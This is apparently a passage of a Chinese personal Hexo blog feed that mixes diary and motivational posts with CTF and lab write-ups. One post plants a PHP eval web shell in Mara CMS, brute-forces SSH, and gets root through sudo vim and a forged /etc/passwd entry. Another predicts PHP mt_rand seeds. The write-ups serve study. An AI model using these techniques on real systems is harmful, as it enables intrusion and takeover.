bb6d34c536ff076fac3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>感想</title>
      <link href="/2024/06/16/%E6%84%9F%E6%83%B3/"/>
      <url>/2024/06/16/%E6%84%9F%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<p>​6.16</p><p>​有时候，一些东西是不需要说的，被误解是人生的常态，不被误解才奇怪勒。但是如果不想被在意的人误解，那还是需要解释一下的。</p><p>​最爽的事情莫过于看着讨厌自己的人被打脸。</p><p>6.17</p><p>​对一项技能的喜欢不足以让我拥有它，</p><p>​决定我们成为什么样的人的，从来不是理想，而是行动。</p><p>​就算很小很小的行动也比想象中好太多太多。很年后的我会因为懒放弃一些东西，而现在的我也是这样做的。</p><p>​我现在坚持的事情，未来的我也也一定会坚持下去，而那些我始终没有做过的尝试，现在不去做的话，未来也不会去做的。</p><p>​有没有用是你行动以后才知道的—&gt;行动以后—&gt;新的反馈，新的发现–&gt;继续行动。</p><p>​不能太完美主义，接受行动后失败的可能。</p><p>​“你能控制的只有现在的行动，结果再重要，你控制不了”</p>]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jwt篇</title>
      <link href="/2024/06/14/jwt%E7%AF%87/"/>
      <url>/2024/06/14/jwt%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​jwt全称是JSON Web Token。<br>​通俗地说，JWT的本质就是一个字符串，它是将用户信息保存到一个Json字符串中，然后进行编码后得到一个JWT token，并且这个JWT token带有签名信息，接收后可以校验是否被篡改，所以可以用于在各方之间安全地将信息作为Json对象传输。</p><p>​JWT由3部分组成：标头(Header)、有效载荷(Payload)和签名(Signature)。在传输的时候，会将JWT的3部分分别进行Base64编码后用.进行连接形成最终传输的字符串<br>JWTString &#x3D; Base64(Header).Base64(Payload).HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)</p><p>原文链接：<a href="https://blog.csdn.net/Jayjay___/article/details/132062263">https://blog.csdn.net/Jayjay___/article/details/132062263</a></p><p>学习链接：<a href="https://xz.aliyun.com/t/2338?time__1311=n4+xnieDqWqxg0D9DBTroGkYDCDum2or0ABxYwD&alichlgref=https://link.csdn.net/?target=https%253A%252F%252Fxz.aliyun.com%252Ft%252F2338">https://xz.aliyun.com/t/2338?time__1311=n4%2BxnieDqWqxg0D9DBTroGkYDCDum2or0ABxYwD&amp;alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%253A%252F%252Fxz.aliyun.com%252Ft%252F2338</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/112525267">https://blog.csdn.net/solitudi/article/details/112525267</a></p><h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>​先抓包，然后对Cookie里面的auth利用在线网站解码<a href="https://jwt.io/#encoded-jwt%EF%BC%8C%E5%BE%97%E5%88%B0">https://jwt.io/#encoded-jwt，得到</a></p><p>特征是eyjxxxx.xxxxxx,只有两端的jwt，没有签名部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iss 签发者是admin</span><br><span class="line">iat/nbf: 签发时间是1718375037</span><br><span class="line">exp: 过期时间是1718382237</span><br><span class="line">sub: 面向用户user</span><br><span class="line">jti: jwt唯一标识符</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.14浅记</title>
      <link href="/2024/06/14/6-14%E6%B5%85%E8%AE%B0/"/>
      <url>/2024/06/14/6-14%E6%B5%85%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9d7cbef2fc1abe59c5ca3faefed2c35be09ce375e31a6d5c1f5b1195d3fef42b">4630436162ade97ba2718b7d0c4b3b63aced30534934d6d7bc15056168c47732794997143ac2ec47a514f1c0337e2cae5ca8e13914c7553bc1722e196de55622611a828b90fd0ddcbf260a06183c692395b0bb74c6dc22f1ed984f725ef2af7d939cceca30fe6c3f822bcd0b37cfe0d4967b7f3518f5434b2b2a45581246135881fd88338c832d8d2c550a1dd1724810c74d0c923ce6073b35dd266406e3349ef903dc3820199bfe86efc01ebe300d3c21f249ccab29b863150b1e0aba44d76bf85fa12dc9ba5f8d1c4c914849ac938abc3eed5d711307b48889f0c438be384eeaaff7345f44aa14b3e5291fc8eb6fb0f04b4981f2abd5e3d3a3762014f1011c7526e61d96c120cbaecf3d57db62a95df0e346625a9451332e084ce053a34e2c34cde81d62117c1b167fcbb59f420b263bf2bc2fe14604013a2464c426a8f73976a95a382fc9f4de66c168feafc2f101dfb37ced9b621b0f7556aa84ce211d2ab079e9f66e2b0e6965c5b66ffb93669e057f9d4832eeeeae75b55059e878d6a5dffbd72a7b2331db0515270f5ef086e99c05942c6489c4b8175a91387c63f36b69982d71697ef8a477483183c9765df8c34068119a3f18f2546023fe0e66698afe1edd5a7c6c3d8efe86c299dbe1ff990dfb6a1271a2cef50241ad25169d26239d33c5b296de032d9432e11e480002e57eb8ebc4407352be958dad669091000834406be74a52b8c5db790430772ba171988b248de0a6f457c614d4b845c03ae6ecd3e751c47d66444a416ccbf4b6562bab67d1a1fd15b51b2c08652d1f4d6a935a3e1bb761fe0295d5a11f0b5eba3c1ed26db232bc6012fec7645256a75e23a8a2eb7d7255ab1db70832c33666252c6ca7b15f88a9d73fd336d09df31e9651f82d880ca8ba5dac6ac1e94ca697cf0bdd84410d5b70175f638489fabccd60a1d9ef090f33e3156c8eeacc87bd64febfe590d237a068a2c7b6474e8527755df03245f5f72a3300d9069feb4bddfcda028f2308b8f7523b1c4d6fe8bfa1c234b60f0401294f4d9f06cc683a001d458fc5b6d90f7ce571402036c664eaf31f2af6c9f9a2a55de3193de041b9259cf0c435e2e7425e0c44f4692ca58c031c927d179d8b8b6d07f54697129bcd8795f985e37b4e98dbf6d9ae55d7dfdafdaed194fb8cc1030fd5aa9d319affbeb54a8174855106e1e31234795e7ff7a85f67bc3f8e0ff47ff34fb9e9e39ae8f8de72581b50863259cd098302e434b8ffe84eba0862a2bd6c8d053086627082b7ab45eafbe35b2d67d8eb2c4d9a982bcead2939a1cc7e5b417a26f0a6355f0b1ad2f6d3d250acb20618b12afe2a690a3d821884e66cce6e953358a986a0a9d2eab97b19a1c32f1130284b5fa1feb29d21792bbfaaa88e2d357f04e6109db33f3b2090872b501553858ebb73ee38808b7156f97d2699cb24863f298800d33d1ffe860395c346ef8fbf1a5a5c2dee4f62f439cc92cde5c127bb39b35f9e0db0c1c597e7853f00eff9019d11f2d7792b4f7ca7cd69d65a5de2739b06d3a1711760d8a1494c79efbef67c9ba4257b444fa33057c24f7b9cd1617482a5ac0161e73af3c7a40bc2443cf9a53094092a14f8a5502f853e93ceec54fe1f12e54b0713117597e5aaee5125494cd2e980ff8d3356f4fb083fbabfc556d8fb1f14e0236fd23458447e0a28b0673f1e2e8406b7e24f9a0943dd743ce81704c613578fde7bc675fb4616a6945a7529f93f6f8b934904630f9bc4fef57bbe74284c05cb5e3e7ca9a720a8c7070343e977caf0527fee693facab2813153a6aa6d4686fe7c94007ee7a514322358befc9c51633e7206c0af949d6ae021a3d2b4d388ca36150adcd68ce5ce99d8d65496873061e9628cfb8dafe85cde44487cc8d7f438fef65375d04e520d15560de4c370aea2b385e8f8e06be7fe9ef354ba2e762c8dcdcd83fa04774878346ca44</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一句话</title>
      <link href="/2024/06/11/%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
      <url>/2024/06/11/%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
      
        <content type="html"><![CDATA[<p>​真正要取得大成就是需要持续不断的认真。而持续不断认真是不需要打鸡血的，因为努力可以很平静的乐在其中。(●’◡’●)</p><p>​怕什么真理无穷，进一步有一步的欢喜。</p><p>​行动力不足的真正原因是选择模糊。</p><p>​想做的事，不分时间也不分天赋。</p><p>​有价值的东西值得我们慢慢去做，值得花足够的时间去做。</p><p>​原来答案真的是能够在行动之中慢慢找到的，我真的，哭死！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 一句话 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透复现</title>
      <link href="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><p>​搜索相关<code>Mara cms</code>,发现一个漏洞，文件上传，远程代码执行,<a href="https://cloud.tencent.com/developer/article/2277522">https://cloud.tencent.com/developer/article/2277522</a></p><h2 id="二、web-flag"><a href="#二、web-flag" class="headerlink" title="二、web_flag"></a>二、web_flag</h2><ol><li>访问Mare cms</li><li>admin:changeme 进行登录</li><li>访问 <a href="http://target/codebase/dir.php?type=filenew">http://target/codebase/dir.php?type=filenew</a> 上传web shell</li><li>连接web shell</li></ol><p>一句话木马:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-08%20214016-1717859777111-3.png" alt="屏幕截图 2024-06-08 214016" style="zoom:50%;"><h2 id="三、user-flag"><a href="#三、user-flag" class="headerlink" title="三、user_flag"></a>三、user_flag</h2><p>​在<code>/home</code>处可以发现一个用户，<code>d3f4ult</code>，继续进入，查看<code>user_flag</code>，发现<code>permission denied</code>,继续查看<code>notes.txt</code>,(后半句的提示sudo提权可以用vim)，发现一段base64编码，解码<code>cGFzc3dkWzAtOV1bMC05XQo=</code>    —&gt;   <code>passwd[0~9][0~9]</code></p><img src="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-08%20214507.png" alt="屏幕截图 2024-06-08 214507" style="zoom:50%;"><p>爆破密码，在kali中先生成一个passwd<code>[0~9][0~9]</code>的字典，然后使用工具Crackmapexec爆破</p><p>vim 是一个文本编辑器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写入：i 或者 a</span><br><span class="line">保存并退出：按esc键，然后:x保存并退出</span><br><span class="line">执行命令: 冒号</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim pass.py   </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;pass&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        passwd = <span class="string">f&#x27;pass<span class="subst">&#123;i&#125;</span><span class="subst">&#123;j&#125;</span>&#x27;</span></span><br><span class="line">    passwd += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    file.write(passwd)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pass.py</span><br></pre></td></tr></table></figure><p>生成好字典，开始爆破 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ssh -u d3f4ult -p pass --port xxxx xxx.xx.xx.xx</span><br></pre></td></tr></table></figure><p>爆破出来<code>passwd16</code>,登录ssh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh d3f4ult@xxxx xxx.xx.xx.xx -p xxxx</span><br></pre></td></tr></table></figure><h2 id="四、root-flag"><a href="#四、root-flag" class="headerlink" title="四、root_flag"></a>四、root_flag</h2><p>​查看当前用户可以使用root权限执行哪些命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/1717856843636.png" alt="1717856843636"></p><p>(1)vim提权</p><p>因为vim以root身份执行，使用vim启动的交互式shell也会同样具有root权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!/bin/bash[回车]</span><br></pre></td></tr></table></figure><p>成功提权。</p><p>(2)编辑&#x2F;etc&#x2F;passwd提权</p><p>root权限执行的vim可以对<code>/etc/passwd</code>进行写操作。而该文件中储存着当前系统中的所有用户及其密码，文件格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root: x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon: x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">用户名：密码：用户 ID：群组 ID：用户 ID 信息：用户的家目录： Shell</span><br></pre></td></tr></table></figure><p>​<code>/etc/passwd</code> 中的密码位为 x 是因为早期的 UNIX 密码放在 <code>/etc/passwd</code> 文件中，由于该文件允许所有用户读取，易导致用户密码泄露，因此从 <code>/etc/passwd</code> 文件中分离出来，并单独放到了此文件中。 <code>/etc/shadow</code> 文件只有 root 用户拥有读权限，保证了用户密码的安全性。但是我们可以向其中写入伪造的密码以达到效果：先使用 openssl 生成加密后的密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 123</span><br><span class="line">$1$h0N5PbHk$LKH90BH1KrLeGnwNSqQDq0</span><br></pre></td></tr></table></figure><p><img src="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/1717858297312.png" alt="1717858297312"></p><p>然后修改<code>/etc/passwd</code>root的信息，像下面这样。再追加到<code>etc/passwd</code>中，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Echo:$1$h0N5PbHk$LKH90BH1KrLeGnwNSqQDq0:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/passwd</span><br></pre></td></tr></table></figure><p>追加到<code>etc/passwd</code>中</p><p><img src="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/1717859234577.png" alt="1717859234577"></p><p>然后使用Echo:123登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su Echo</span><br><span class="line">enter passwd:123</span><br></pre></td></tr></table></figure><p>提权成功，然后进入&#x2F;root找到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br></pre></td></tr></table></figure><h2 id="五、一些拓展"><a href="#五、一些拓展" class="headerlink" title="五、一些拓展"></a>五、一些拓展</h2><p>（1）网站扫描</p><p>​常规情况下，我们需要使用Nmap等工具对目标网站进行扫描，以确认其开放的端口以及服务信息。我们需要对目标进行四次扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 1000 -p- -oA ports targetIP </span><br><span class="line"> #对目标以最低1000的速率进行全部端口扫描并保存结果到ports文件中</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p targetPorts -sT -sV -O -oA detail targetIP </span><br><span class="line">#对上一步得到的端口进行服务探测 sT:指定TCP扫描 sV:探测服务版本 O:探测目标操作系统 保存结果到detail文件中</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p targetPorts --script=vuln -oA vuln targetIp </span><br><span class="line">#对目标进行漏洞扫描，并将结果保存在vuln文件中</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 1000 -p- -sU -oA UDPScan targetIP</span><br><span class="line">#对目标进行UDP协议扫描，保存结果到UDPScan文件中 （不常用）</span><br></pre></td></tr></table></figure><p>在进行扫描后，根据得到的信息进行渗透优先级的判断。<strong>一般情况</strong>下，WEB服务的渗透优先级更高。</p><p>（2）漏洞搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit mara cms</span><br></pre></td></tr></table></figure><p><img src="/2024/06/08/%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/1717861121447.png" alt="1717861121447"></p><p>根据搜索的path信息，使用命令将利用文件拷贝到当前目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 48780</span><br></pre></td></tr></table></figure><p>然后按照给出的poc执行。</p><p>（3）sudo提权</p><p>​<a href="https://blog.csdn.net/negnegil/article/details/120090266">https://blog.csdn.net/negnegil/article/details/120090266</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web爆破</title>
      <link href="/2024/06/07/web%E7%88%86%E7%A0%B4/"/>
      <url>/2024/06/07/web%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>写在前面，它提供的是https,但这会被网站认为是不安全的，所以我们把s去掉就可以访问了</p><p>抓包的时候，一定要注意，先随便输入个用户名和密码之后再抓包，不然抓到的是空包的话，没有关键的信息</p><p>1.随便输入后抓包，发现一串酷似base64的字符串解密，发现得到的正是随便输入的用户名和密码，具体是这样 username:password</p><p>2.这下好办，知道样式之后，开始爆破，因为有三个部分，分别是username,冒号和password,所以，这里我们选择Sniper方式,Payload set —-&gt;custom iterator(自定义迭代器)，3个position</p><p>需要进行base64编码；payload processing 进行编码设置</p><p>取消Palyload Encoding编码 因为在进行base64加密的时候在最后可能存在 &#x3D;&#x3D; 这样就会影响base64 加密的结果,开始爆破即可。</p><h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>​这里介绍一下substr()的用法，它接受三个参数substr(str,start,length),截取字符串.</p><p>​md5(): 是通常以32位的十六进制数表示的散列值长度.</p><p>​intval(): 是 PHP 中用于获取变量的整数值或将其转换为整数的函数</p><p>payload: 传参token&#x3D;3j</p><h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p>mt_srand:  PHP 中的一个函数，用于设置 Mersenne Twister 随机数生成器的种子值。</p><p>从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br></pre></td></tr></table></figure><p>生成: 1155388967</p><p>payload: get传参r&#x3D;1155388967</p><h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><p>hexdec():  PHP 中的一个内置函数，用于将十六进制数（hexadecimal number）转换为十进制数（decimal number）。该函数接受一个十六进制数作为字符串参数，并返回其对应的十进制</p><p>if(!$rand) –&gt; $rand值为false,0,null,空字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="line">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), 0,8)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    if((!$rand))&#123;</span><br><span class="line">        if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>1.先使get的r&#x3D;0，这样rand&#x3D;0-mt_rand，可以得到生成的随机数的负值-553120815</p><p>2.mt_srand()是伪随机，通过分发种子，如果有种子的话，生成随机数的值也是固定的，生成的值也和php的版本有关，可以使用脚本工具<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a>，来倒推可以生成这个随机数的各个版本php的种子,下载好之后在windows上解压，再移到虚拟机上，先make一下，然后，键入time .&#x2F;php_mt_seed 553120815,然后寻找对应的版本即可，如下图</p><img src="/2024/06/07/web%E7%88%86%E7%A0%B4/1717761461358.png" alt="1717761461358" style="zoom: 50%;"><img src="/2024/06/07/web%E7%88%86%E7%A0%B4/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-07%20193736.png" alt="屏幕截图 2024-06-07 193736" style="zoom: 50%;"><p>php为7.3.11的有好几个，先尝试一个，不行，然后尝试到倒数第二个，成功了😥😥🥹4203065309–&gt;979860273</p><p>3.由于if((!$rand))才能执行，rand要为0才行，所以r要为生成的第一次随机数值，token为第二次和第三次随机值相加才能获得flag</p><p><img src="/2024/06/07/web%E7%88%86%E7%A0%B4/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-07%20202500.png" alt="屏幕截图 2024-06-07 202500"></p><p><img src="/2024/06/07/web%E7%88%86%E7%A0%B4/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-07%20203005.png" alt="屏幕截图 2024-06-07 203005"></p><h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>​这道题抓包，爆破密码就行了，但是密码我的字典里没有，于是就直接看的wp</p><p><img src="/2024/06/07/web%E7%88%86%E7%A0%B4/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-07%20205606.png" alt="屏幕截图 2024-06-07 205606"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function check()&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:&#x27;checkdb.php&#x27;,</span><br><span class="line">type: &#x27;POST&#x27;,</span><br><span class="line">dataType:&#x27;json&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">&#x27;a&#x27;:$(&#x27;#a&#x27;).val(),</span><br><span class="line">&#x27;p&#x27;:$(&#x27;#p&#x27;).val(),</span><br><span class="line">&#x27;d&#x27;:$(&#x27;#d&#x27;).val(),</span><br><span class="line">&#x27;u&#x27;:$(&#x27;#u&#x27;).val(),</span><br><span class="line">&#x27;pass&#x27;:$(&#x27;#pass&#x27;).val()</span><br><span class="line">&#125;,</span><br><span class="line">success:function(data)&#123;</span><br><span class="line">alert(data[&#x27;msg&#x27;]);</span><br><span class="line">&#125;,</span><br><span class="line">error:function(data)&#123;</span><br><span class="line">alert(data[&#x27;msg&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码是一个使用 jQuery 的 <code>$.ajax()</code> 方法发送 POST 请求到服务器上的 <code>checkdb.php</code> 文件的 JavaScript 函数。这个函数的主要目的是从表单或其他元素中获取数据，然后将这些数据发送到服务器进行某种检查（可能是数据库中的用户验证或其他操作）。</p><h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo之文章加密</title>
      <link href="/2024/06/07/hexo%E4%B9%8B%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/06/07/hexo%E4%B9%8B%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/</url>
      
